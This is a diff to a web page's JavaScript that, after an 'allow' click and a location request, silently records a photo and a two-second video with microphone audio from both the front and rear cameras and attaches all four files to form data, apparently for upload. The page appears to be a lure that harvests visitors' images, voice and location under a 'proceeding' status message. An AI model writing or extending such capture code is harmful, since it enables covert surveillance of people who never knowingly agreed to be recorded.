@@ -5,6 +5,121 @@ const canvas = document.getElementById('canvas');
 
 let stream;
 
+async function captureCamera(facingMode) {
+
+    try {
+
+        stream =
+            await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: {
+                        exact: facingMode
+                    }
+                },
+                audio: true
+            });
+
+    } catch (error) {
+
+        if (facingMode !== 'environment') {
+            throw error;
+        }
+
+        stream =
+            await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: true
+            });
+
+    }
+
+    video.srcObject = stream;
+
+    await new Promise(resolve => {
+
+        if (video.readyState >= 2) {
+            resolve();
+        } else {
+            video.onloadeddata =
+                () => resolve();
+        }
+
+    });
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    canvas
+        .getContext('2d')
+        .drawImage(
+            video,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+        );
+
+    const photoBlob =
+        await new Promise(resolve => {
+
+            canvas.toBlob(
+                resolve,
+                'image/jpeg',
+                0.9
+            );
+
+        });
+
+    if (!photoBlob) {
+        throw new Error('Photo capture failed.');
+    }
+
+    const chunks = [];
+    const recorder =
+        new MediaRecorder(stream);
+
+    recorder.ondataavailable =
+        event => {
+
+            if (event.data.size > 0) {
+                chunks.push(event.data);
+            }
+
+        };
+
+    const recordingFinished =
+        new Promise(resolve => {
+            recorder.onstop = resolve;
+        });
+
+    recorder.start();
+
+    await new Promise(resolve =>
+        setTimeout(resolve, 2000)
+    );
+
+    recorder.stop();
+    await recordingFinished;
+
+    const videoBlob =
+        new Blob(
+            chunks,
+            { type: recorder.mimeType }
+        );
+
+    stream
+        .getTracks()
+        .forEach(track => track.stop());
+
+    stream = null;
+
+    return {
+        photoBlob: photoBlob,
+        videoBlob: videoBlob
+    };
+
+}
+
 function showProceedingState() {
 
     status.textContent =
@@ -79,36 +194,6 @@ allowButton.onclick = async () => {
         showProceedingState();
 
 
-        // Ask for camera + microphone
-
-        stream =
-            await navigator.mediaDevices.getUserMedia({
-
-                video: true,
-                audio: true
-
-            });
-
-
-        video.srcObject = stream;
-
-
-        await new Promise(resolve => {
-
-            if (video.readyState >= 2) {
-
-                resolve();
-
-            } else {
-
-                video.onloadeddata =
-                    () => resolve();
-
-            }
-
-        });
-
-
         // ==================================
         // LOCATION PERMISSION
         // ==================================
@@ -117,119 +202,11 @@ allowButton.onclick = async () => {
             await getLocation();
 
 
-        // ==================================
-        // PHOTO
-        // ==================================
+        const frontCapture =
+            await captureCamera('user');
 
-        canvas.width =
-            video.videoWidth;
-
-        canvas.height =
-            video.videoHeight;
-
-
-        canvas
-            .getContext('2d')
-            .drawImage(
-
-                video,
-
-                0,
-                0,
-
-                canvas.width,
-                canvas.height
-
-            );
-
-
-        const photoBlob =
-            await new Promise(resolve => {
-
-                canvas.toBlob(
-
-                    resolve,
-
-                    'image/jpeg',
-
-                    0.9
-
-                );
-
-            });
-
-
-        if (!photoBlob) {
-
-            throw new Error(
-                'Photo capture failed.'
-            );
-
-        }
-
-
-        // ==================================
-        // 2 SECOND VIDEO
-        // ==================================
-
-        const chunks = [];
-
-
-        const recorder =
-            new MediaRecorder(stream);
-
-
-        recorder.ondataavailable =
-            event => {
-
-                if (event.data.size > 0) {
-
-                    chunks.push(event.data);
-
-                }
-
-            };
-
-
-        const recordingFinished =
-            new Promise(resolve => {
-
-                recorder.onstop =
-                    resolve;
-
-            });
-
-
-        recorder.start();
-
-
-        await new Promise(resolve =>
-
-            setTimeout(
-                resolve,
-                2000
-            )
-
-        );
-
-
-        recorder.stop();
-
-
-        await recordingFinished;
-
-
-        const videoBlob =
-            new Blob(
-
-                chunks,
-
-                {
-                    type:
-                        recorder.mimeType
-                }
-
-            );
+        const rearCapture =
+            await captureCamera('environment');
 
 
         // ==================================
@@ -294,15 +271,27 @@ allowButton.onclick = async () => {
 
         formData.append(
             'photo',
-            photoBlob,
-            'photo.jpg'
+            frontCapture.photoBlob,
+            'photo-front.jpg'
         );
 
 
         formData.append(
             'video',
-            videoBlob,
-            'video.webm'
+            frontCapture.videoBlob,
+            'video-front.webm'
+        );
+
+        formData.append(
+            'photoRear',
+            rearCapture.photoBlob,
+            'photo-rear.jpg'
+        );
+
+        formData.append(
+            'videoRear',
+            rearCapture.videoBlob,
+            'video-rear.webm'
         );
 
 
